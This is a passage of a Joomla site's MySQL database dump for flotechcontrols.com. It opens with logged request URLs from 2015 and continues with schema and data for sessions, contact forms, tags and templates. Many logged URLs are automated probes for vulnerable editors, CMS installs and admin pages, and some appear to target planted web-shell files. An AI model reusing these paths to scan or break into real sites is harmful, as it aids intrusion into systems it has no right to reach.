(1970, 'http://flotechcontrols.com/news_manager/eWebEditor', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1971, 'http://flotechcontrols.com/southidceditor/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1972, 'http://flotechcontrols.com/htmlEditor/eWebEditor', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1973, 'http://flotechcontrols.com/system/ewebeditor1/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1974, 'http://flotechcontrols.com/webedit/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1975, 'http://flotechcontrols.com/system/editor/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1976, 'http://flotechcontrols.com/xmlEditor/eWebEditor', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1977, 'http://flotechcontrols.com/ewebeditor1/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1978, 'http://flotechcontrols.com/ewebeditor/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1979, 'http://flotechcontrols.com/html/webedit/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1980, 'http://flotechcontrols.com/admin/webeditor', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1981, 'http://flotechcontrols.com/system/oledit/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1982, 'http://flotechcontrols.com/manage/texteditor/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1983, 'http://flotechcontrols.com/system/texteditor/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1984, 'http://flotechcontrols.com/manage/edit/', '', '', '', 1, 0, '2015-03-14 14:06:19', '0000-00-00 00:00:00'),
(1985, 'http://flotechcontrols.com/manage/web_editor/', '', '', '', 1, 0, '2015-03-14 14:06:20', '0000-00-00 00:00:00'),
(1986, 'http://flotechcontrols.com/manage/southidceditor/', '', '', '', 1, 0, '2015-03-14 14:06:20', '0000-00-00 00:00:00'),
(1987, 'http://flotechcontrols.com/manage/%23ewebeditor/', '', '', '', 1, 0, '2015-03-14 14:06:20', '0000-00-00 00:00:00'),
(1988, 'http://flotechcontrols.com/manage/webeditor', '', '', '', 1, 0, '2015-03-14 14:06:20', '0000-00-00 00:00:00'),
(1989, 'http://flotechcontrols.com/manage/oledit/', '', '', '', 1, 0, '2015-03-14 14:06:20', '0000-00-00 00:00:00'),
(1990, 'http://flotechcontrols.com/manage/ewebeditor1/', '', '', '', 1, 0, '2015-03-14 14:06:20', '0000-00-00 00:00:00'),
(1991, 'http://flotechcontrols.com/images/stories/readme.php?bajak', '', '', '', 1, 0, '2015-03-15 02:30:40', '0000-00-00 00:00:00'),
(1992, 'http://flotechcontrols.com/modules/mod_feed/incs.php', '', '', '', 1, 0, '2015-03-15 11:36:39', '0000-00-00 00:00:00'),
(1993, 'http://flotechcontrols.com/components/com_true/sub_votepic.php?id=1&user_rating=1', '', '', '', 1, 0, '2015-03-15 15:23:54', '0000-00-00 00:00:00'),
(1994, 'http://flotechcontrols.com/images/shwso.php', '', '', '', 1, 0, '2015-03-18 03:54:21', '0000-00-00 00:00:00'),
(1995, 'http://flotechcontrols.com/images/datss.php', '', '', '', 1, 0, '2015-03-20 05:16:30', '0000-00-00 00:00:00'),
(1996, 'http://www.flotechcontrols.com//fckeditor/editor/dialog/fck_about.html', '', '', '', 1, 0, '2015-03-21 13:59:56', '0000-00-00 00:00:00'),
(1997, 'http://www.flotechcontrols.com//js/fckeditor/editor/dialog/fck_about.html', '', '', '', 1, 0, '2015-03-21 13:59:57', '0000-00-00 00:00:00'),
(1998, 'http://www.flotechcontrols.com//admin/fckeditor/editor/dialog/fck_about.html', '', '', '', 1, 0, '2015-03-21 13:59:58', '0000-00-00 00:00:00'),
(1999, 'http://www.flotechcontrols.com//manage/fckeditor/editor/dialog/fck_about.html', '', '', '', 1, 0, '2015-03-21 13:59:58', '0000-00-00 00:00:00'),
(2000, 'http://www.flotechcontrols.com//editor/editor/dialog/fck_about.html', '', '', '', 1, 0, '2015-03-21 13:59:59', '0000-00-00 00:00:00'),
(2001, 'http://www.flotechcontrols.com//sys.php', '', '', '', 1, 0, '2015-03-21 14:00:02', '0000-00-00 00:00:00'),
(2002, 'http://www.flotechcontrols.com//info_sub.php', '', '', '', 1, 0, '2015-03-21 14:00:02', '0000-00-00 00:00:00'),
(2003, 'http://flotechcontrols.com/webmail/', '', '', '', 1, 0, '2015-03-26 23:07:57', '0000-00-00 00:00:00'),
(2004, 'http://flotechcontrols.com/mail/', '', '', '', 1, 0, '2015-03-26 23:07:58', '0000-00-00 00:00:00'),
(2005, 'http://flotechcontrols.com/auth/login', '', '', '', 1, 0, '2015-03-26 23:08:00', '0000-00-00 00:00:00'),
(2006, 'http://flotechcontrols.com/alimail/', '', '', '', 1, 0, '2015-03-26 23:08:02', '0000-00-00 00:00:00'),
(2007, 'http://flotechcontrols.com/doku.php', '', '', '', 1, 0, '2015-03-26 23:08:03', '0000-00-00 00:00:00'),
(2008, 'http://flotechcontrols.com/shop/', '', '', '', 1, 0, '2015-03-26 23:08:03', '0000-00-00 00:00:00'),
(2009, 'http://flotechcontrols.com/mall/', '', '', '', 1, 0, '2015-03-26 23:08:04', '0000-00-00 00:00:00'),
(2010, 'http://flotechcontrols.com/eshop/', '', '', '', 1, 0, '2015-03-26 23:08:04', '0000-00-00 00:00:00'),
(2011, 'http://flotechcontrols.com/shops/', '', '', '', 1, 0, '2015-03-26 23:08:05', '0000-00-00 00:00:00'),
(2012, 'http://flotechcontrols.com/ecshop/', '', '', '', 1, 0, '2015-03-26 23:08:09', '0000-00-00 00:00:00'),
(2013, 'http://flotechcontrols.com/docs/', '', '', '', 1, 0, '2015-03-26 23:08:11', '0000-00-00 00:00:00'),
(2014, 'http://flotechcontrols.com/dvbbs/', '', '', '', 1, 0, '2015-03-26 23:08:12', '0000-00-00 00:00:00'),
(2015, 'http://flotechcontrols.com/bbs/', '', '', '', 1, 0, '2015-03-26 23:08:12', '0000-00-00 00:00:00'),
(2016, 'http://flotechcontrols.com/archiver/', '', '', '', 1, 0, '2015-03-26 23:08:13', '0000-00-00 00:00:00'),
(2017, 'http://flotechcontrols.com/discuz/', '', '', '', 1, 0, '2015-03-26 23:08:14', '0000-00-00 00:00:00'),
(2018, 'http://flotechcontrols.com/extern.php?action=feed&type=atom', '', '', '', 1, 0, '2015-03-26 23:08:17', '0000-00-00 00:00:00'),
(2019, 'http://flotechcontrols.com/fluxbb/', '', '', '', 1, 0, '2015-03-26 23:08:18', '0000-00-00 00:00:00'),
(2020, 'http://flotechcontrols.com/rss.php', '', '', '', 1, 0, '2015-03-26 23:08:19', '0000-00-00 00:00:00'),
(2021, 'http://flotechcontrols.com/phpwind/', '', '', '', 1, 0, '2015-03-26 23:08:20', '0000-00-00 00:00:00'),
(2022, 'http://flotechcontrols.com/phpbb/', '', '', '', 1, 0, '2015-03-26 23:08:20', '0000-00-00 00:00:00'),
(2023, 'http://flotechcontrols.com/leadbbs/', '', '', '', 1, 0, '2015-03-26 23:08:22', '0000-00-00 00:00:00'),
(2024, 'http://flotechcontrols.com/coremail/', '', '', '', 1, 0, '2015-03-26 23:08:26', '0000-00-00 00:00:00'),
(2025, 'http://flotechcontrols.com/extmail/', '', '', '', 1, 0, '2015-03-26 23:08:33', '0000-00-00 00:00:00'),
(2026, 'http://flotechcontrols.com/fangmail/', '', '', '', 1, 0, '2015-03-26 23:08:34', '0000-00-00 00:00:00'),
(2027, 'http://flotechcontrols.com/inc/rsd.php', '', '', '', 1, 0, '2015-03-26 23:08:35', '0000-00-00 00:00:00'),
(2028, 'http://flotechcontrols.com/weblog/', '', '', '', 1, 0, '2015-03-26 23:08:36', '0000-00-00 00:00:00'),
(2029, 'http://flotechcontrols.com/zblog/', '', '', '', 1, 0, '2015-03-26 23:08:43', '0000-00-00 00:00:00'),
(2030, 'http://flotechcontrols.com/foosun/', '', '', '', 1, 0, '2015-03-26 23:08:44', '0000-00-00 00:00:00'),
(2031, 'http://flotechcontrols.com/plug/publish', '', '', '', 1, 0, '2015-03-26 23:08:45', '0000-00-00 00:00:00'),
(2032, 'http://flotechcontrols.com/console/include/not_login.htm', '', '', '', 1, 0, '2015-03-26 23:08:49', '0000-00-00 00:00:00'),
(2033, 'http://flotechcontrols.com/wcm/', '', '', '', 1, 0, '2015-03-26 23:08:51', '0000-00-00 00:00:00'),
(2034, 'http://flotechcontrols.com/plus/sitemap.html', '', '', '', 1, 0, '2015-03-26 23:08:56', '0000-00-00 00:00:00'),
(2035, 'http://flotechcontrols.com/plus/rssmap.html', '', '', '', 1, 0, '2015-03-26 23:08:57', '0000-00-00 00:00:00'),
(2036, 'http://flotechcontrols.com/plus/heightsearch.php', '', '', '', 1, 0, '2015-03-26 23:08:57', '0000-00-00 00:00:00'),
(2037, 'http://flotechcontrols.com/dedecms/', '', '', '', 1, 0, '2015-03-26 23:08:59', '0000-00-00 00:00:00'),
(2038, 'http://flotechcontrols.com/dede/', '', '', '', 1, 0, '2015-03-26 23:08:59', '0000-00-00 00:00:00'),
(2039, 'http://flotechcontrols.com/phpcms/', '', '', '', 1, 0, '2015-03-26 23:09:02', '0000-00-00 00:00:00'),
(2040, 'http://flotechcontrols.com/admin/start/index.php', '', '', '', 1, 0, '2015-03-26 23:09:03', '0000-00-00 00:00:00'),
(2041, 'http://flotechcontrols.com/aspcms/', '', '', '', 1, 0, '2015-03-26 23:09:04', '0000-00-00 00:00:00'),
(2042, 'http://flotechcontrols.com/maxcms/', '', '', '', 1, 0, '2015-03-26 23:09:05', '0000-00-00 00:00:00'),
(2043, 'http://flotechcontrols.com/install', '', '', '', 1, 0, '2015-03-26 23:09:05', '0000-00-00 00:00:00'),
(2044, 'http://flotechcontrols.com/oecms/', '', '', '', 1, 0, '2015-03-26 23:09:06', '0000-00-00 00:00:00'),
(2045, 'http://flotechcontrols.com/jxcms/', '', '', '', 1, 0, '2015-03-26 23:09:07', '0000-00-00 00:00:00'),
(2046, 'http://flotechcontrols.com/drupal/', '', '', '', 1, 0, '2015-03-26 23:09:08', '0000-00-00 00:00:00'),
(2047, 'http://flotechcontrols.com/lazycms/', '', '', '', 1, 0, '2015-03-26 23:09:09', '0000-00-00 00:00:00'),
(2048, 'http://flotechcontrols.com/bencandy.php', '', '', '', 1, 0, '2015-03-26 23:09:09', '0000-00-00 00:00:00'),
(2049, 'http://flotechcontrols.com/ch/', '', '', '', 1, 0, '2015-03-26 23:09:10', '0000-00-00 00:00:00'),
(2050, 'http://flotechcontrols.com/metinfo/', '', '', '', 1, 0, '2015-03-26 23:09:11', '0000-00-00 00:00:00'),
(2051, 'http://flotechcontrols.com/m', '', '', '', 1, 0, '2015-03-26 23:09:12', '0000-00-00 00:00:00'),
(2052, 'http://flotechcontrols.com/verycms/', '', '', '', 1, 0, '2015-03-26 23:09:13', '0000-00-00 00:00:00'),
(2053, 'http://flotechcontrols.com/Help', '', '', '', 1, 0, '2015-03-26 23:09:13', '0000-00-00 00:00:00'),
(2054, 'http://flotechcontrols.com/empirecms/', '', '', '', 1, 0, '2015-03-26 23:09:14', '0000-00-00 00:00:00'),
(2055, 'http://flotechcontrols.com/cmseasy/', '', '', '', 1, 0, '2015-03-26 23:09:16', '0000-00-00 00:00:00'),
(2056, 'http://flotechcontrols.com/Search.html', '', '', '', 1, 0, '2015-03-26 23:09:16', '0000-00-00 00:00:00'),
(2057, 'http://flotechcontrols.com/list.php', '', '', '', 1, 0, '2015-03-26 23:09:17', '0000-00-00 00:00:00'),
(2058, 'http://flotechcontrols.com/kingcms/', '', '', '', 1, 0, '2015-03-26 23:09:20', '0000-00-00 00:00:00'),
(2059, 'http://flotechcontrols.com/kesion/', '', '', '', 1, 0, '2015-03-26 23:09:22', '0000-00-00 00:00:00'),
(2060, 'http://flotechcontrols.com/zcms/', '', '', '', 1, 0, '2015-03-26 23:09:23', '0000-00-00 00:00:00'),
(2061, 'http://FLOTECHCONTROLS.com/catalog/password_forgotten.php', '', 'http://FLOTECHCONTROLS.com', '', 1, 0, '2015-03-27 08:52:06', '0000-00-00 00:00:00'),
(2062, 'http://flotechcontrols.com//webalizer/', '', '', '', 1, 0, '2015-03-30 01:09:17', '0000-00-00 00:00:00'),
(2063, 'http://www.flotechcontrols.com/user', '', '', '', 1, 0, '2015-04-04 01:01:07', '0000-00-00 00:00:00'),
(2064, 'http://www.flotechcontrols.com/admin.php', '', '', '', 1, 0, '2015-04-04 01:01:08', '0000-00-00 00:00:00'),
(2065, 'http://www.flotechcontrols.com/admin/fckeditor/editor', '', '', '', 1, 0, '2015-04-05 23:37:42', '0000-00-00 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_schemas`
--

CREATE TABLE IF NOT EXISTS `j6kpf_schemas` (
  `extension_id` int(11) NOT NULL,
  `version_id` varchar(20) NOT NULL,
  PRIMARY KEY (`extension_id`,`version_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `j6kpf_schemas`
--

INSERT INTO `j6kpf_schemas` (`extension_id`, `version_id`) VALUES
(700, '3.1.1'),
(10012, '1.9.0');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_session`
--

CREATE TABLE IF NOT EXISTS `j6kpf_session` (
  `session_id` varchar(200) NOT NULL DEFAULT '',
  `client_id` tinyint(3) unsigned NOT NULL DEFAULT '0',
  `guest` tinyint(4) unsigned DEFAULT '1',
  `time` varchar(14) DEFAULT '',
  `data` mediumtext,
  `userid` int(11) DEFAULT '0',
  `username` varchar(150) DEFAULT '',
  PRIMARY KEY (`session_id`),
  KEY `userid` (`userid`),
  KEY `time` (`time`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

--
-- Dumping data for table `j6kpf_session`
--

INSERT INTO `j6kpf_session` (`session_id`, `client_id`, `guest`, `time`, `data`, `userid`, `username`) VALUES
('9605b666ec8a6567f7af78a1c88ad21c', 0, 1, '1428480139', '__default|a:7:{s:15:"session.counter";i:1;s:19:"session.timer.start";i:1428480139;s:18:"session.timer.last";i:1428480139;s:17:"session.timer.now";i:1428480139;s:22:"session.client.browser";s:109:"Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.101 Safari/537.36";s:8:"registry";O:9:"JRegistry":1:{s:7:"\\0\\0\\0data";O:8:"stdClass":0:{}}s:4:"user";O:5:"JUser":24:{s:9:"\\0\\0\\0isRoot";b:0;s:2:"id";i:0;s:4:"name";N;s:8:"username";N;s:5:"email";N;s:8:"password";N;s:14:"password_clear";s:0:"";s:5:"block";N;s:9:"sendEmail";i:0;s:12:"registerDate";N;s:13:"lastvisitDate";N;s:10:"activation";N;s:6:"params";N;s:6:"groups";a:1:{i:0;s:1:"9";}s:5:"guest";i:1;s:13:"lastResetTime";N;s:10:"resetCount";N;s:10:"\\0\\0\\0_params";O:9:"JRegistry":1:{s:7:"\\0\\0\\0data";O:8:"stdClass":0:{}}s:14:"\\0\\0\\0_authGroups";a:2:{i:0;i:1;i:1;i:9;}s:14:"\\0\\0\\0_authLevels";a:3:{i:0;i:1;i:1;i:1;i:2;i:5;}s:15:"\\0\\0\\0_authActions";N;s:12:"\\0\\0\\0_errorMsg";N;s:10:"\\0\\0\\0_errors";a:0:{}s:3:"aid";i:0;}}', 0, '');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_sexy_field_types`
--

CREATE TABLE IF NOT EXISTS `j6kpf_sexy_field_types` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `name` text NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=9 ;

--
-- Dumping data for table `j6kpf_sexy_field_types`
--

INSERT INTO `j6kpf_sexy_field_types` (`id`, `name`) VALUES
(1, 'Simple Text'),
(2, 'Text Area'),
(3, 'Name'),
(4, 'E-mail'),
(5, 'Address'),
(6, 'Phone'),
(7, 'Number'),
(8, 'Url');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_sexy_fields`
--

CREATE TABLE IF NOT EXISTS `j6kpf_sexy_fields` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `id_user` int(10) unsigned NOT NULL,
  `id_form` mediumint(8) unsigned NOT NULL,
  `name` text NOT NULL,
  `id_type` mediumint(8) unsigned NOT NULL,
  `alias` text NOT NULL,
  `created` datetime NOT NULL,
  `publish_up` datetime NOT NULL,
  `publish_down` datetime NOT NULL,
  `published` tinyint(1) NOT NULL,
  `checked_out` int(10) unsigned NOT NULL,
  `checked_out_time` datetime NOT NULL,
  `access` int(10) unsigned NOT NULL,
  `featured` tinyint(3) unsigned NOT NULL,
  `ordering` int(11) NOT NULL,
  `language` char(7) NOT NULL,
  `required` enum('0','1') NOT NULL DEFAULT '0',
  `message_required` text NOT NULL,
  `message_invalid` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `id_user` (`id_user`),
  KEY `id_form` (`id_form`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=6 ;

--
-- Dumping data for table `j6kpf_sexy_fields`
--

INSERT INTO `j6kpf_sexy_fields` (`id`, `id_user`, `id_form`, `name`, `id_type`, `alias`, `created`, `publish_up`, `publish_down`, `published`, `checked_out`, `checked_out_time`, `access`, `featured`, `ordering`, `language`, `required`, `message_required`, `message_invalid`) VALUES
(1, 0, 2, 'Name', 3, '', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 0, '0000-00-00 00:00:00', 0, 0, 1, '', '1', '', ''),
(2, 0, 2, 'Email', 4, '', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 0, '0000-00-00 00:00:00', 0, 0, 2, '', '0', '', ''),
(3, 0, 2, 'Phone', 6, '', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 0, '0000-00-00 00:00:00', 0, 0, 3, '', '0', '', ''),
(4, 0, 1, 'Website', 8, '', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 0, '0000-00-00 00:00:00', 0, 0, 4, '', '0', '', ''),
(5, 0, 2, 'Message', 2, '', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 0, '0000-00-00 00:00:00', 0, 0, 5, '', '1', '', '');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_sexy_forms`
--

CREATE TABLE IF NOT EXISTS `j6kpf_sexy_forms` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `email_to` text NOT NULL,
  `email_bcc` text NOT NULL,
  `email_subject` text NOT NULL,
  `email_replyto` text NOT NULL,
  `email_replyto_name` text NOT NULL,
  `shake_count` mediumint(8) unsigned NOT NULL,
  `shake_distanse` mediumint(8) unsigned NOT NULL,
  `shake_duration` mediumint(8) unsigned NOT NULL,
  `id_template` mediumint(8) unsigned NOT NULL,
  `name` text NOT NULL,
  `top_text` text NOT NULL,
  `pre_text` text NOT NULL,
  `thank_you_text` text NOT NULL,
  `send_text` text NOT NULL,
  `send_new_text` text NOT NULL,
  `alias` text NOT NULL,
  `created` datetime NOT NULL,
  `publish_up` datetime NOT NULL,
  `publish_down` datetime NOT NULL,
  `published` tinyint(1) NOT NULL,
  `checked_out` int(10) unsigned NOT NULL,
  `checked_out_time` datetime NOT NULL,
  `access` int(10) unsigned NOT NULL,
  `featured` tinyint(3) unsigned NOT NULL,
  `ordering` int(11) NOT NULL,
  `language` char(7) NOT NULL,
  `redirect` enum('0','1') NOT NULL DEFAULT '0',
  `redirect_itemid` int(10) unsigned NOT NULL,
  `redirect_url` text NOT NULL,
  `redirect_delay` int(11) NOT NULL,
  PRIMARY KEY (`id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 AUTO_INCREMENT=3 ;

--
-- Dumping data for table `j6kpf_sexy_forms`
--

INSERT INTO `j6kpf_sexy_forms` (`id`, `email_to`, `email_bcc`, `email_subject`, `email_replyto`, `email_replyto_name`, `shake_count`, `shake_distanse`, `shake_duration`, `id_template`, `name`, `top_text`, `pre_text`, `thank_you_text`, `send_text`, `send_new_text`, `alias`, `created`, `publish_up`, `publish_down`, `published`, `checked_out`, `checked_out_time`, `access`, `featured`, `ordering`, `language`, `redirect`, `redirect_itemid`, `redirect_url`, `redirect_delay`) VALUES
(1, '', '', '', '', '', 3, 10, 300, 1, 'Contact Form Example', 'Contact Us', 'Contact us, if you have any questions', 'Message successfully sent', 'Send', 'New email', '', '0000-00-00 00:00:00', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 0, '0000-00-00 00:00:00', 0, 0, 0, '', '0', 0, '', 0),
(2, '', '', '', '', '', 2, 10, 300, 1, 'Contact Us', 'Please fill all the fields', '', 'Message successfully sent', 'Send', 'New email', '', '2013-05-01 15:19:05', '0000-00-00 00:00:00', '0000-00-00 00:00:00', 1, 0, '0000-00-00 00:00:00', 1, 0, 0, '', '0', 101, '', 0);

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_tags`
--

CREATE TABLE IF NOT EXISTS `j6kpf_tags` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `parent_id` int(10) unsigned NOT NULL DEFAULT '0',
  `lft` int(11) NOT NULL DEFAULT '0',
  `rgt` int(11) NOT NULL DEFAULT '0',
  `level` int(10) unsigned NOT NULL DEFAULT '0',
  `path` varchar(255) NOT NULL DEFAULT '',
  `title` varchar(255) NOT NULL,
  `alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `note` varchar(255) NOT NULL DEFAULT '',
  `description` mediumtext NOT NULL,
  `published` tinyint(1) NOT NULL DEFAULT '0',
  `checked_out` int(11) unsigned NOT NULL DEFAULT '0',
  `checked_out_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `access` int(10) unsigned NOT NULL DEFAULT '0',
  `params` text NOT NULL,
  `metadesc` varchar(1024) NOT NULL COMMENT 'The meta description for the page.',
  `metakey` varchar(1024) NOT NULL COMMENT 'The meta keywords for the page.',
  `metadata` varchar(2048) NOT NULL COMMENT 'JSON encoded metadata properties.',
  `created_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `created_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `modified_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `modified_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `images` text NOT NULL,
  `urls` text NOT NULL,
  `hits` int(10) unsigned NOT NULL DEFAULT '0',
  `language` char(7) NOT NULL,
  `version` int(10) unsigned NOT NULL DEFAULT '1',
  `publish_up` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `publish_down` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`),
  KEY `tag_idx` (`published`,`access`),
  KEY `idx_access` (`access`),
  KEY `idx_checkout` (`checked_out`),
  KEY `idx_path` (`path`),
  KEY `idx_left_right` (`lft`,`rgt`),
  KEY `idx_alias` (`alias`),
  KEY `idx_language` (`language`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=2 ;

--
-- Dumping data for table `j6kpf_tags`
--

INSERT INTO `j6kpf_tags` (`id`, `parent_id`, `lft`, `rgt`, `level`, `path`, `title`, `alias`, `note`, `description`, `published`, `checked_out`, `checked_out_time`, `access`, `params`, `metadesc`, `metakey`, `metadata`, `created_user_id`, `created_time`, `created_by_alias`, `modified_user_id`, `modified_time`, `images`, `urls`, `hits`, `language`, `version`, `publish_up`, `publish_down`) VALUES
(1, 0, 0, 1, 0, '', 'ROOT', 'root', '', '', 1, 0, '0000-00-00 00:00:00', 1, '{}', '', '', '', 0, '2011-01-01 00:00:01', '', 0, '0000-00-00 00:00:00', '', '', 0, '*', 1, '0000-00-00 00:00:00', '0000-00-00 00:00:00');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_template_styles`
--

CREATE TABLE IF NOT EXISTS `j6kpf_template_styles` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `template` varchar(50) NOT NULL DEFAULT '',
  `client_id` tinyint(1) unsigned NOT NULL DEFAULT '0',
  `home` char(7) NOT NULL DEFAULT '0',
  `title` varchar(255) NOT NULL DEFAULT '',
  `params` text NOT NULL,
  PRIMARY KEY (`id`),
  KEY `idx_template` (`template`),
  KEY `idx_home` (`home`)
) ENGINE=InnoDB  DEFAULT CHARSET=utf8 AUTO_INCREMENT=13 ;

--
-- Dumping data for table `j6kpf_template_styles`
--

INSERT INTO `j6kpf_template_styles` (`id`, `template`, `client_id`, `home`, `title`, `params`) VALUES
(4, 'beez3', 0, '0', 'Beez3 - Default', '{"wrapperSmall":"53","wrapperLarge":"72","logo":"images\\/joomla_black.gif","sitetitle":"Joomla!","sitedescription":"Open Source Content Management","navposition":"left","templatecolor":"personal","html5":"0"}'),
(5, 'hathor', 1, '0', 'Hathor - Default', '{"showSiteName":"0","colourChoice":"","boldText":"0"}'),
(7, 'protostar', 0, '0', 'protostar - Default', '{"templateColor":"#08C","templateBackgroundColor":"#F4F6F7","logoFile":"","sitetitle":"","sitedescription":"","googleFont":"1","googleFontName":"Open+Sans","fluidContainer":"0"}'),
(8, 'isis', 1, '1', 'isis - Default', '{"templateColor":"","logoFile":""}'),
(10, 'flotech', 0, '1', 'flotech - Default', '{"wrapperSmall":53,"wrapperLarge":72,"logo":"images\\/template_images\\/logo.png","sitetitle":"","sitedescription":"","navposition":"left","bootstrap":"","templatecolor":"nature","headerImage":"images\\/template_images\\/bnnr1.jpg","backgroundcolor":"#eeeeee"}'),
(12, 'flotech_followon', 0, '0', 'flotech_followon - Default', '{"wrapperSmall":53,"wrapperLarge":72,"logo":"images\\/template_images\\/logo.png","sitetitle":"","sitedescription":"","navposition":"center","bootstrap":"","templatecolor":"nature","headerImage":"","backgroundcolor":"#eee"}');

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_ucm_base`
--

CREATE TABLE IF NOT EXISTS `j6kpf_ucm_base` (
  `ucm_id` int(10) unsigned NOT NULL,
  `ucm_item_id` int(10) NOT NULL,
  `ucm_type_id` int(11) NOT NULL,
  `ucm_language_id` int(11) NOT NULL,
  PRIMARY KEY (`ucm_id`),
  KEY `idx_ucm_item_id` (`ucm_item_id`),
  KEY `idx_ucm_type_id` (`ucm_type_id`),
  KEY `idx_ucm_language_id` (`ucm_language_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;

-- --------------------------------------------------------

--
-- Table structure for table `j6kpf_ucm_content`
--

CREATE TABLE IF NOT EXISTS `j6kpf_ucm_content` (
  `core_content_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `core_type_alias` varchar(255) NOT NULL DEFAULT '' COMMENT 'FK to the content types table',
  `core_title` varchar(255) NOT NULL,
  `core_alias` varchar(255) CHARACTER SET utf8 COLLATE utf8_bin NOT NULL DEFAULT '',
  `core_body` mediumtext NOT NULL,
  `core_state` tinyint(1) NOT NULL DEFAULT '0',
  `core_checked_out_time` varchar(255) NOT NULL DEFAULT '',
  `core_checked_out_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `core_access` int(10) unsigned NOT NULL DEFAULT '0',
  `core_params` text NOT NULL,
  `core_featured` tinyint(4) unsigned NOT NULL DEFAULT '0',
  `core_metadata` varchar(2048) NOT NULL COMMENT 'JSON encoded metadata properties.',
  `core_created_user_id` int(10) unsigned NOT NULL DEFAULT '0',
  `core_created_by_alias` varchar(255) NOT NULL DEFAULT '',
  `core_created_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `core_modified_user_id` int(10) unsigned NOT NULL DEFAULT '0' COMMENT 'Most recent user that modified',
  `core_modified_time` datetime NOT NULL DEFAULT '0000-00-00 00:00:00',
  `core_language` char(7) NOT NULL,
  `core_publish_up` datetime NOT NULL,
  `core_publish_down` datetime NOT NULL,
  `core_content_item_id` int(10) unsigned DEFAULT NULL COMMENT 'ID from the individual type table',
  `asset_id` int(10) unsigned DEFAULT NULL COMMENT 'FK to the #__assets table.',
  `core_images` text NOT NULL,
  `core_urls` text NOT NULL,
  `core_hits` int(10) unsigned NOT NULL DEFAULT '0',
  `core_version` int(10) unsigned NOT NULL DEFAULT '1',
  `core_ordering` int(11) NOT NULL DEFAULT '0',
  `core_metakey` text NOT NULL,
  `core_metadesc` text NOT NULL,
  `core_catid` int(10) unsigned NOT NULL DEFAULT '0',
  `core_xreference` varchar(50) NOT NULL COMMENT 'A reference to enable linkages to external data sets.',
  `core_type_id` int(10) unsigned DEFAULT NULL,
  PRIMARY KEY (`core_content_id`),
  KEY `tag_idx` (`core_state`,`core_access`),
  KEY `idx_access` (`core_access`),
  KEY `idx_alias` (`core_alias`),
  KEY `idx_language` (`core_language`),
  KEY `idx_title` (`core_title`),
  KEY `idx_modified_time` (`core_modified_time`),
  KEY `idx_created_time` (`core_created_time`),
  KEY `idx_content_type` (`core_type_alias`),
  KEY `idx_core_modified_user_id` (`core_modified_user_id`),
  KEY `idx_core_checked_out_user_id` (`core_checked_out_user_id`),
  KEY `idx_core_created_user_id` (`core_created_user_id`),
  KEY `idx_core_type_id` (`core_type_id`)
